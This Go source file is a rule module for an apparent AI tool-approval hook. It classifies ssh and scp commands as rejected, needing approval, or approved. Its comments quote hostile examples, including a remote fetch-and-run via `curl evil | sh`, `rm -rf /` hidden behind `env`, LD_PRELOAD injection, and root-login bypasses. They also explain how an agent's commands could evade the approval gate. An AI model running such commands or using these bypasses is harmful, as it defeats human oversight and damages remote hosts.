// Package ssh is a config-driven MECHANISM for classifying ssh/scp commands (a
// hook-support parity capability; SshCommandEvaluator). It follows the
// kubectl/buildtools template: the evaluation logic lives here in ceta-core,
// and all policy DATA (allowed users, read-only command allowlist, secret-path
// patterns, password-auth flag patterns) arrives via an injected
// configrules.SshConfig — the rules.json `ssh` block, wired in by
// internal/setup/factory.go.
//
// SAFE DEFAULT: an empty config makes the rule Abstain on every command, so a
// consumer that ships no `ssh` block never has ssh auto-approved or blocked by
// this rule — it defers. Only once a consumer supplies data does the mechanism
// classify.
//
// Mechanism (when configured):
//   - password-auth block: sshpass wrapper, or an -o option matching a
//     PasswordFlagPatterns substring -> Reject. The option value is routed
//     through cmdparse.GluedFlagValue/UnwrapGluedQuotes first, so a glued
//     quote (`-o PasswordAuthentication='yes'`) matches identically to the
//     unquoted spelling (see checkPasswordAuth); quoting cmdparse cannot
//     confidently resolve also -> Reject (fail closed on a denylist, never
//     fail open).
//   - user allowlist: an explicit user (-l, -o User=, or user@host) not in
//     AllowedUsers, or conflicting users -> Reject.
//   - read-only classification: ssh with no remote command -> Ask (interactive);
//     otherwise the remote command is split by the ONE quote-aware splitter
//     (cmdparse.Parse — tc-yk2z; see splitSegments' obituary for what it replaced
//     and why) and Approved when EVERY leaf has its executable in ReadonlyCommands
//     (honoring ReadonlySubcommands), carries no environment assignment and no
//     command/process substitution (see carriesSubstitution — its body would run
//     unreviewed on the remote host), has no
//     file-writing redirect (see hasWriteRedirection: `2>&1` and `2>/dev/null` are
//     fine, `> f` is not), pipes into no stage that may PERSIST what it receives
//     (cmdparse.PipeFilterCmds — the same shared allowlist the gitdir rule uses,
//     where an unknown sink is a writer), and names no secret path; otherwise Ask.
//     A leaf whose executable is in ReadonlyCommands but which carries a configured
//     DangerousInlineFlags flag (e.g. `journalctl --vacuum-size=1G`, `sed -i`) is
//     demoted back to Ask.
//   - scp: download from a non-secret remote path -> Approve; upload, mixed
//     local/remote, or a secret remote path -> Ask.
package ssh

import (
	"fmt"
	"path/filepath"
	"strings"

	"github.com/phillipgreenii/claude-extended-tool-approver/internal/cmdparse"
	"github.com/phillipgreenii/claude-extended-tool-approver/internal/hookio"
	"github.com/phillipgreenii/claude-extended-tool-approver/internal/rules/configrules"
)

// sshValueFlags are ssh/scp short flags that consume the following token as
// their value (so it is not mistaken for the host/positional).
var sshValueFlags = map[string]bool{
	"-l": true, "-i": true, "-F": true, "-p": true, "-P": true, "-J": true,
	"-o": true, "-c": true, "-b": true, "-D": true, "-E": true, "-e": true,
	"-I": true, "-L": true, "-m": true, "-O": true, "-Q": true, "-R": true,
	"-S": true, "-W": true, "-w": true, "-B": true,
}

type Rule struct {
	configured           bool
	allowedUsers         map[string]bool
	readonlyCommands     map[string]bool
	readonlySubcommands  map[string]map[string]bool
	dangerousInlineFlags map[string][]string
	secretPathPatterns   []string
	passwordFlagPatterns []string
}

// New constructs the ssh rule from cfg (the rules.json `ssh` block). A zero cfg
// makes the rule Abstain on every command (the safe base default).
func New(cfg configrules.SshConfig) *Rule {
	r := &Rule{
		allowedUsers:         toSet(cfg.AllowedUsers),
		readonlyCommands:     toSet(cfg.ReadonlyCommands),
		readonlySubcommands:  map[string]map[string]bool{},
		dangerousInlineFlags: cfg.DangerousInlineFlags,
		secretPathPatterns:   cfg.SecretPathPatterns,
		passwordFlagPatterns: lowerAll(cfg.PasswordFlagPatterns),
	}
	for cmd, subs := range cfg.ReadonlySubcommands {
		r.readonlySubcommands[cmd] = toSet(subs)
	}
	r.configured = len(cfg.AllowedUsers) > 0 || len(cfg.ReadonlyCommands) > 0 ||
		len(cfg.ReadonlySubcommands) > 0 || len(cfg.DangerousInlineFlags) > 0 ||
		len(cfg.SecretPathPatterns) > 0 || len(cfg.PasswordFlagPatterns) > 0
	return r
}

func toSet(items []string) map[string]bool {
	m := make(map[string]bool, len(items))
	for _, it := range items {
		m[it] = true
	}
	return m
}

func lowerAll(items []string) []string {
	out := make([]string, len(items))
	for i, s := range items {
		out[i] = strings.ToLower(s)
	}
	return out
}

func (r *Rule) Name() string { return "ssh" }

// notApplicable replaces the former abstain() helper. Every one of its call sites
// meant "this rule does not govern this input" and relied on the engine continuing,
// which is now the ErrNotApplicable control signal rather than a verdict. It is
// deliberately NOT a terminal NoOpinion: this rule is ordered BEFORE safe-commands
// specifically so a configured ssh leaf reaches it first, and a terminal verdict
// here would stop safe-commands (and everything after it) from ever seeing an
// UNconfigured one.
func (r *Rule) notApplicable() (hookio.RuleResult, error) { return hookio.NotApplicable() }

func (r *Rule) Evaluate(input *hookio.HookInput) (hookio.RuleResult, error) {
	if input.ToolName != "Bash" {
		return r.notApplicable()
	}
	// WS2 safe default: with no injected policy data, defer entirely. WS3 wires
	// the rules.json config that flips `configured` on.
	if !r.configured {
		return r.notApplicable()
	}
	parsed, err := cmdparse.LeavesOf(input)
	if err != nil {
		// Genuine failure, not "not mine": the tool is Bash and this rule IS
		// configured, so it does govern the input and merely could not read it.
		return hookio.RuleResult{}, fmt.Errorf("ssh: read bash command: %w", err)
	}
	for _, pc := range parsed {
		base := filepath.Base(pc.Executable)
		switch base {
		case "sshpass":
			return hookio.RuleResult{
				Decision: hookio.Reject,
				Reason:   "sshpass wrapper is forbidden — use key-based auth",
				Module:   r.Name(),
			}, nil
		case "ssh", "scp":
			return r.evaluateSSHScp(base, pc.Args), nil
		}
	}
	// No ssh/scp/sshpass leaf in the command.
	return r.notApplicable()
}

// evaluateSSHScp classifies a single ssh/scp leaf.
func (r *Rule) evaluateSSHScp(base string, args []string) hookio.RuleResult {
	users, opts, positionals := tokenize(base, args)

	if res, blocked := r.checkPasswordAuth(opts); blocked {
		return res
	}
	if res, blocked := r.checkUsers(users); blocked {
		return res
	}
	if base == "ssh" {
		return r.evaluateSSH(positionals)
	}
	return r.evaluateSCP(positionals)
}

// tokenize splits ssh/scp args into the referenced users, -o option key=values
// (lowercased), and positional tokens (host + remote command for ssh; sources +
// dest for scp).
func tokenize(base string, args []string) (users map[string]bool, opts map[string]string, positionals []string) {
	users = map[string]bool{}
	opts = map[string]string{}
	seenPositional := false
	i := 0
	for i < len(args) {
		tok := args[i]
		if !seenPositional && strings.HasPrefix(tok, "-") && len(tok) > 1 {
			// Glued short-option forms: `-oKEY=VAL` (the -o value attached to the
			// flag) and `-lUSER`. ssh accepts these identically to the spaced form,
			// so they MUST be parsed the same way or the user-allowlist and
			// password-auth checks are trivially bypassed (`ssh -oUser=root host`).
			if v, ok := strings.CutPrefix(tok, "-o"); ok && v != "" {
				recordOption(opts, v)
				i++
				continue
			}
			if v, ok := strings.CutPrefix(tok, "-l"); ok && v != "" {
				users[strings.ToLower(v)] = true
				i++
				continue
			}
			if sshValueFlags[tok] && i+1 < len(args) {
				val := args[i+1]
				switch tok {
				case "-l":
					users[strings.ToLower(val)] = true
				case "-o":
					recordOption(opts, val)
				}
				i += 2
				continue
			}
			i++
			continue
		}
		positionals = append(positionals, tok)
		seenPositional = true
		i++
	}
	// The -o User= option names a login user exactly like -l / user@host, so it
	// MUST feed the same allowlist check (otherwise `ssh -o User=root host` is
	// approved despite root being disallowed).
	if u := opts["user"]; u != "" {
		users[u] = true // already lowercased by recordOption
	}
	// user@host / user@host:path forms.
	if base == "ssh" && len(positionals) > 0 {
		if u, ok := userFromHost(positionals[0]); ok {
			users[strings.ToLower(u)] = true
		}
	} else if base == "scp" {
		for _, p := range positionals {
			if isRemoteToken(p) {
				host := strings.SplitN(p, ":", 2)[0]
				if u, ok := userFromHost(host); ok {
					users[strings.ToLower(u)] = true
				}
			}
		}
	}
	return users, opts, positionals
}

// recordOption stores an ssh `-o KEY=VALUE` option into opts, lowercasing the
// KEY (ssh option names are case-insensitive) and the VALUE (so downstream
// substring matching of password-auth / user patterns is case-insensitive).
func recordOption(opts map[string]string, kv string) {
	k, v, _ := strings.Cut(kv, "=")
	opts[strings.ToLower(strings.TrimSpace(k))] = strings.ToLower(strings.TrimSpace(v))
}

func userFromHost(host string) (string, bool) {
	if i := strings.Index(host, "@"); i > 0 {
		return host[:i], true
	}
	return "", false
}

// checkPasswordAuth is a DENYLIST: an -o value is Rejected only when it
// matches a configured PasswordFlagPatterns substring, so retained quote
// characters make the match FAIL rather than refuse — the opposite failure
// direction from an allowlist. tokenize/recordOption store the value exactly
// as cmdparse's tokenizer produced it, which strips quotes only from a WHOLLY
// quoted token; a value GLUED to its unquoted key
// (`-o PasswordAuthentication='yes'`) keeps its quote pair, and
// `passwordauthentication='yes'` never contains the configured substring
// `passwordauthentication=yes`. Measured: that spelling reached only Ask, the
// engine's next-weakest verdict, never Approve — but Ask is still a WEAKER
// verdict than the Reject the unquoted spelling gets for an identical shell
// command, which is this bug.
func (r *Rule) checkPasswordAuth(opts map[string]string) (hookio.RuleResult, bool) {
	for k, v := range opts {
		// Route the value half through the same GluedFlagValue/UnwrapGluedQuotes
		// seam every other `key=value` reader in this repo calls (pg2-9zgso) —
		// exactly what that helper was built to strip — rather than matching a
		// denylist substring against text that still carries its quote
		// characters. The synthetic "-"+k+"="+v arg reuses GluedFlagValue's
		// existing glued-value + malformed detection instead of re-deriving it.
		unwrapped, _, malformed := cmdparse.GluedFlagValue("-" + k + "=" + v)
		joined := k + "=" + unwrapped
		for _, pat := range r.passwordFlagPatterns {
			if strings.Contains(joined, pat) {
				return hookio.RuleResult{
					Decision: hookio.Reject,
					Reason:   "password-based ssh auth is forbidden: -o " + joined,
					Module:   r.Name(),
				}, true
			}
		}
		// FAIL CLOSED, not fail open, when the quoting could not be resolved
		// (cmdparse.UnwrapGluedQuotes declined: a double-wrapped value, an
		// interior wrapper character, or a mismatched/unterminated quote pair —
		// see its doc comment for the exact residual subset it will not touch).
		// Falling through to the substring test above with the STILL-QUOTED
		// value can only ever UNDER-match, silently reopening this same bug for
		// the one subset the unwrap cannot cleanly resolve. Scoped to keys a
		// configured pattern actually names (passwordKeyIsPoliced), so an
		// unrelated option's odd quoting (e.g. `ServerAliveInterval=''5''`) is
		// not penalized.
		if malformed && r.passwordKeyIsPoliced(k) {
			return hookio.RuleResult{
				Decision: hookio.Reject,
				Reason:   "password-based ssh auth cannot be verified safe: -o " + k + "=" + v + " has glued quoting that cannot be resolved",
				Module:   r.Name(),
			}, true
		}
	}
	return hookio.RuleResult{}, false
}

// passwordKeyIsPoliced reports whether k is the option-key half of any
// configured PasswordFlagPatterns entry (documented as lowercased
// "key=value" substrings, e.g. "passwordauthentication=yes"). It scopes
// checkPasswordAuth's fail-closed malformed-quoting branch to keys this rule
// actually polices, rather than rejecting every -o option whose value happens
// to carry odd quoting.
func (r *Rule) passwordKeyIsPoliced(k string) bool {
	prefix := k + "="
	for _, pat := range r.passwordFlagPatterns {
		if strings.HasPrefix(pat, prefix) {
			return true
		}
	}
	return false
}

func (r *Rule) checkUsers(users map[string]bool) (hookio.RuleResult, bool) {
	if len(users) == 0 {
		return hookio.RuleResult{}, false
	}
	if len(users) > 1 {
		return hookio.RuleResult{
			Decision: hookio.Reject,
			Reason:   "conflicting ssh users",
			Module:   r.Name(),
		}, true
	}
	var user string
	for u := range users {
		user = u
	}
	if !r.allowedUsers[user] {
		return hookio.RuleResult{
			Decision: hookio.Reject,
			Reason:   "ssh user '" + user + "' is not in the allowed set",
			Module:   r.Name(),
		}, true
	}
	return hookio.RuleResult{}, false
}

func (r *Rule) evaluateSSH(positionals []string) hookio.RuleResult {
	if len(positionals) == 0 {
		return hookio.RuleResult{Decision: hookio.Reject, Reason: "ssh with no host", Module: r.Name()}
	}
	remote := positionals[1:]
	if len(remote) == 0 {
		return hookio.RuleResult{Decision: hookio.Ask, Reason: "interactive ssh session requires approval", Module: r.Name()}
	}
	remoteCmd := strings.Join(remote, " ")
	if r.matchesSecretPath(remoteCmd) {
		return hookio.RuleResult{Decision: hookio.Ask, Reason: "remote command references a secret path", Module: r.Name()}
	}
	// The remote command is ordinary shell text, so it is split by the ONE
	// quote-aware splitter (the cmdparse seam) rather than a local approximation —
	// see splitSegments' obituary below.
	//
	// FAIL CLOSED ON AN UNPARSEABLE REMOTE COMMAND. This branch's fall-through is an
	// APPROVAL: the loop below only ever ESCALATES, so a remote command that yields
	// NO leaves is approved by default. While cmdparse derived structure by byte
	// scanning, malformed text still produced a leaf and that leaf still failed the
	// allowlist; ADR 0039 step 2 made the front end a real grammar, which returns an
	// EMPTY leaf set for text it cannot parse — so `ssh host 'cat $(curl'` and
	// `ssh host 'ls -la >&'` would have started auto-approving. This is I1b at a rule
	// boundary: an empty result is absence of evidence, never evidence of absence.
	sp := cmdparse.ParseShell(remoteCmd)
	if sp.Unparseable {
		return hookio.RuleResult{
			Decision: hookio.Ask,
			Reason:   "remote command is not parseable shell (" + sp.Reason + "): it cannot be shown read-only",
			Module:   r.Name(),
		}
	}
	leaves := sp.Leaves
	for _, pc := range leaves {
		if !r.segmentIsReadonly(pc) {
			return hookio.RuleResult{Decision: hookio.Ask, Reason: "remote command is not a recognized read-only command: " + pc.Raw, Module: r.Name()}
		}
		// A stage that is itself read-only can still hand the bytes to a stage that
		// PERSISTS them (`journalctl -u x | tee /var/log/copy`). The sink question is
		// the same one gitdir asks about a `.git/` read, so it is answered by the same
		// shared allowlist (cmdparse.PipeFilterCmds), where an UNKNOWN sink is a
		// writer — not by naming `tee` and hoping nobody uses `dd`, `sponge`, `split`
		// or `logger`.
		if cmdparse.PipedToWriter(leaves, pc.Raw) {
			return hookio.RuleResult{Decision: hookio.Ask, Reason: "remote command pipes into a stage that may write what it receives: " + pc.Raw, Module: r.Name()}
		}
	}
	return hookio.RuleResult{Decision: hookio.Approve, Reason: "ssh read-only command on non-secret path", Module: r.Name()}
}

func (r *Rule) evaluateSCP(positionals []string) hookio.RuleResult {
	if len(positionals) < 2 {
		return hookio.RuleResult{Decision: hookio.Reject, Reason: "scp requires source and destination", Module: r.Name()}
	}
	sources := positionals[:len(positionals)-1]
	dest := positionals[len(positionals)-1]

	if isRemoteToken(dest) {
		return hookio.RuleResult{Decision: hookio.Ask, Reason: "scp upload requires approval", Module: r.Name()}
	}
	var remoteSources []string
	for _, s := range sources {
		if isRemoteToken(s) {
			remoteSources = append(remoteSources, s)
		} else {
			return hookio.RuleResult{Decision: hookio.Ask, Reason: "scp with local source requires approval", Module: r.Name()}
		}
	}
	if len(remoteSources) == 0 {
		return hookio.RuleResult{Decision: hookio.Ask, Reason: "scp with no remote source requires approval", Module: r.Name()}
	}
	for _, s := range remoteSources {
		remotePath := strings.SplitN(s, ":", 2)[1]
		if r.matchesSecretPath(remotePath) {
			return hookio.RuleResult{Decision: hookio.Ask, Reason: "scp download references a secret path", Module: r.Name()}
		}
	}
	return hookio.RuleResult{Decision: hookio.Approve, Reason: "scp download from non-secret path", Module: r.Name()}
}

func (r *Rule) matchesSecretPath(s string) bool {
	for _, pat := range r.secretPathPatterns {
		if pat != "" && strings.Contains(s, pat) {
			return true
		}
	}
	return false
}

// splitSegments IS GONE (tc-yk2z). It was
//
//	strings.NewReplacer("||", "\n", "&&", "\n", ";", "\n", "|", "\n")
//
// applied to the remote command, justified as "the remote command is opaque text,
// so a coarse split is enough". It is not enough, and the corpus says so: over
// every non-excluded decision row, 191 DISTINCT ssh remote commands split
// differently under that replacer than under the quote-aware splitter — nearly all
// of them an alternation inside a quoted `grep -E` / `jq` / `sed` argument. Corpus
// row 2204's `ps -ef --forest | grep -E "k3s|containerd|flannel" | grep -v grep`
// became FIVE segments, two of which were the bare words `containerd` and
// `flannel"`. Those are in no allowlist, so a read-only inspection was refused over
// a `|` that was never a pipe. That the fragments were not even valid commands is
// the tell: the rule was classifying text it had itself shredded.
//
// cmdparse.Parse is the ONE quote-aware splitter (splitCompound + tokenize over
// the shared shellScanner); it already tracks single quotes, double quotes,
// backticks, `$( )` frames, subshells and heredoc extents, and it records the
// pipeline relation this rule now needs for its sink check. Reusing it also picks
// up the parser's exec-prefix unwrapping, which closed a live hole: `ssh host 'env
// rm -rf /'` used to be judged on executable `env` — a member of this consumer's
// ReadonlyCommands — and APPROVED. It is now judged on `rm`.

// segmentIsReadonly reports whether one leaf of the remote command is a
// recognized read-only invocation: no file-writing redirect (hasWriteRedirection
// draws that line — stderr redirection such as `2>&1` is NOT a write), no
// environment assignment, executable in ReadonlyCommands, and (if the command has
// a configured subcommand allowlist) its first subcommand token is allowed.
//
// The `tee` special case that used to sit beside the allowlist lookup is GONE. A
// one-entry denylist can only ever catch the sink somebody thought of, and it was
// redundant besides — `tee` is not in any consumer's ReadonlyCommands, so the
// default already refused it. Writing sinks are now classified where they are
// reachable at all: on the PIPELINE, by evaluateSSH's shared-allowlist check.
//
// TWO deliberate non-uses of what cmdparse offers:
//
//   - the WRITE test still scans pc.Raw with hasWriteRedirection rather than
//     reading pc.Redirections. The two draw the line in different places —
//     `2> /tmp/err` creates a real file on the remote host but captures no stdout,
//     so a Redirections-based test shaped like cmdparse.CapturesStdout would
//     quietly start approving it. tc-85g7 chose this line; tc-j7k2 re-examined it
//     and kept it, for a second and independent reason: pc.Redirections does not
//     even SEE `1> f`, `9> f`, `>| f`, `<>` or `3>&1` (extractRedirections matches
//     `>`, `>>`, `2>`, `2>>`, `&>`, `<` and nothing else), so those arrive as
//     ordinary Args and a Redirections-only test would call every one of them
//     read-only. What tc-j7k2 DID change is that the raw scan is now quote-aware.
//   - a leaf carrying an ENVIRONMENT ASSIGNMENT is never read-only. cmdparse lifts
//     `FOO=bar ls` into EnvVars plus executable `ls`, and `env LD_PRELOAD=/evil.so
//     ls` into that same shape; judging the executable alone would auto-approve
//     both. The old splitter got this right only by accident — its first field was
//     the literal `FOO=bar`, which is in no allowlist — so stating it explicitly
//     preserves the verdict instead of inheriting the accident.
func (r *Rule) segmentIsReadonly(pc cmdparse.ParsedCommand) bool {
	if hasWriteRedirection(pc.Raw) {
		return false
	}
	if len(pc.EnvVars) > 0 {
		return false
	}
	if carriesSubstitution(pc.Raw) {
		return false
	}
	base := pc.Executable
	if base == "" || !r.readonlyCommands[base] {
		return false
	}
	if allowed, ok := r.readonlySubcommands[base]; ok {
		sub := firstSubToken(pc.Args)
		if sub == "" || !allowed[sub] {
			return false
		}
	}
	// A configured dangerous inline flag demotes an otherwise read-only command
	// back to Ask: a token equal to the flag or beginning with "<flag>=" (e.g.
	// `journalctl --vacuum-size=1G`, `sed -i`) is destructive despite the command
	// being in ReadonlyCommands.
	for _, bad := range r.dangerousInlineFlags[base] {
		for _, tok := range pc.Args {
			if tok == bad || strings.HasPrefix(tok, bad+"=") {
				return false
			}
		}
	}
	return true
}

// carriesSubstitution reports whether a remote-command leaf embeds a command or
// process substitution — or text this package cannot model well enough to say it
// does not.
//
// A `$( )` / backtick / `<( )` body in the REMOTE command runs an arbitrary
// command ON THE REMOTE HOST, and nothing inspects it: the engine's
// substitution-body recursion operates on the LOCAL expression, where the whole
// remote command is one quoted argument, so it never descends here, and this rule
// judges only the leaf's executable. `ssh host 'cat $(curl http://evil)'` is
// therefore an allowlisted `cat` wrapping an unreviewed remote fetch, and it
// APPROVED — including before tc-yk2z, so this is a pre-existing hole rather than
// one the quote-aware split opened.
//
// What the split DID change is that the old replacer masked one spelling of it by
// accident: `echo $(curl evil | sh)` was shredded at the `|` INSIDE the
// substitution, and the fragment `sh)` matched no allowlist, so the command
// Asked. A quote-aware splitter correctly keeps the substitution glued into one
// leaf — and would have started approving it. Refusing the whole class restores
// that verdict on purpose instead of by accident, and closes the unpiped
// spelling the accident never covered.
//
// An UNPARSEABLE scan is refused for the same reason ScanSubstitutions exists to
// distinguish: "no substitution found" after the scan desynced is not evidence
// there is none, and this branch's alternative is an approval.
//
// MEASURED COST: exactly ONE corpus row, 4109 —
// `ssh media0 'head -60 …/$(ls -t …/*.log | head -1 | xargs basename)'`. That row
// Asks on unpatched main as well (the replacer shredded it at the `|` inside the
// substitution and left `xargs basename)` unmatched), so this check RESTORES its
// status quo rather than introducing a new prompt. Net against main, this rule's
// corpus delta is 48 rows, all `ask -> approve`, none the other way.
func carriesSubstitution(raw string) bool {
	scan := cmdparse.ScanSubstitutions(raw)
	return scan.Unparseable || len(scan.Substitutions) > 0
}

// hasWriteRedirection reports whether a remote-command segment contains an
// output redirection that could CREATE OR MODIFY A FILE on the remote host.
//
// It replaces a bare `strings.Contains(seg, ">")` test, which could not tell a
// real redirection from the ubiquitous stderr idiom `2>&1` and so refused
// allowlisted read-only commands (`ls -la … 2>&1` was reported as "not a
// recognized read-only command").
//
// POLICY — what counts as a WRITE (segment is NOT read-only):
//
//   - Any redirection whose TARGET IS A PATH, on any file descriptor:
//     `> f`, `>> f`, `>| f`, `1> f`, `2> f`, `9>> f`, `&> f`, `&>> f`, and
//     bash's both-streams `>& f` (a target that is neither an fd number nor `-`).
//   - The read-write open `<>`, which may create/truncate its target.
//
// POLICY — what is HARMLESS (does not by itself disqualify the segment):
//
//   - File-descriptor DUPLICATION and CLOSE: `N>&M` (`2>&1`, `>&2`) and `N>&-`.
//     These create no file; they only re-point an existing stream.
//   - A redirection to `/dev/null` on ANY descriptor (`2>/dev/null`,
//     `&>/dev/null`, `>/dev/null`). The target is the null device, so output is
//     discarded rather than written.
//   - INPUT redirection — `< f`, `<< EOF`, `<<< word`, `<&N` — which only reads.
//
// The classifier FAILS CLOSED: an operator whose target cannot be read as an fd
// number, `-`, or `/dev/null` is treated as a write. A false "write" costs one
// approval prompt; a false "read-only" costs an unreviewed file write on a
// remote host, so the asymmetry is deliberate.
//
// QUOTE-AWARENESS (tc-j7k2). The scan is over the segment's RAW TEXT, because
// pc.Redirections does not model the shapes this policy turns on — `1> f`,
// `9> f`, `>| f`, `<>` and `3>&1` all reach ParsedCommand as ARGUMENTS, so a
// classifier reading only pc.Redirections would call them read-only and start
// approving remote writes. Scanning raw text is therefore kept, and made
// quote-aware instead: cmdparse.UnquotedMask marks which bytes carry live
// operator meaning, and a `<`/`>` inside quotes is skipped. Without that,
// `ssh host "grep '>' f"` reported grep's own PATTERN as a redirection and
// Asked. Only OPERATOR detection consults the mask; the TARGET word is still
// read from the real text, so `> '/dev/null'` stays harmless.
//
// Scope note: `|& tee f` needs no special case here — cmdparse.Parse splits the
// pipe, and the `tee` stage is then refused twice over: it is in no consumer's
// ReadonlyCommands, and it is not in cmdparse.PipeFilterCmds either, so the
// pipeline sink check reports it as a writer.
func hasWriteRedirection(seg string) bool {
	live := cmdparse.UnquotedMask(seg)
	for i := 0; i < len(seg); i++ {
		if !live[i] {
			continue
		}
		switch seg[i] {
		case '<':
			// `<>` opens the target for reading AND writing; every other input
			// form (`<`, `<<`, `<<<`, `<&N`) only reads.
			if i+1 < len(seg) && live[i+1] && seg[i+1] == '>' {
				return true
			}
		case '>':
			// Consume the operator's remaining punctuation: `>>` (append) and
			// `>|` (clobber) still take a FILE target, so they change nothing
			// about the classification below.
			j := i + 1
			for j < len(seg) && live[j] && (seg[j] == '>' || seg[j] == '|') {
				j++
			}
			if j < len(seg) && live[j] && seg[j] == '&' {
				// `N>&WORD`: a bare fd number or `-` duplicates/closes a
				// descriptor and touches no file. Anything else is bash's
				// both-streams-to-file form and IS a write.
				j++
				word, next := readWord(seg, j)
				if word != "-" && !isAllDigits(word) {
					return true
				}
				i = next - 1
				continue
			}
			// Ordinary file target, spaced (`> f`) or glued (`>f`).
			for j < len(seg) && isShellSpace(seg[j]) {
				j++
			}
			word, next := readWord(seg, j)
			if strings.Trim(word, `"'`) != "/dev/null" {
				return true
			}
			i = next - 1
		}
	}
	return false
}

// readWord returns the whitespace-delimited word starting at byte index i and
// the index just past it. An empty word means the operator had no target. Byte
// indexing is safe: every delimiter it tests is ASCII, so a multi-byte rune is
// never split.
func readWord(s string, i int) (string, int) {
	j := i
	for j < len(s) && !isShellSpace(s[j]) {
		j++
	}
	return s[i:j], j
}

func isShellSpace(c byte) bool { return c == ' ' || c == '\t' || c == '\n' || c == '\r' }

// isAllDigits reports whether s is a non-empty run of ASCII digits (an fd
// number). The empty string is NOT a digit run, so a dangling `>&` fails closed.
func isAllDigits(s string) bool {
	if s == "" {
		return false
	}
	for _, c := range s {
		if c < '0' || c > '9' {
			return false
		}
	}
	return true
}

// firstSubToken returns the first token of args, whether a bare positional
// (e.g. "status") or a flag-style subcommand (e.g. "--query"), or "".
func firstSubToken(args []string) string {
	if len(args) == 0 {
		return ""
	}
	return args[0]
}

// isRemoteToken reports whether an scp token is a remote `host:path` (a colon
// before any slash), not a local path with a colon in a directory name.
func isRemoteToken(token string) bool {
	colon := strings.Index(token, ":")
	if colon < 0 {
		return false
	}
	slash := strings.Index(token, "/")
	if slash >= 0 && slash < colon {
		return false
	}
	return true
}
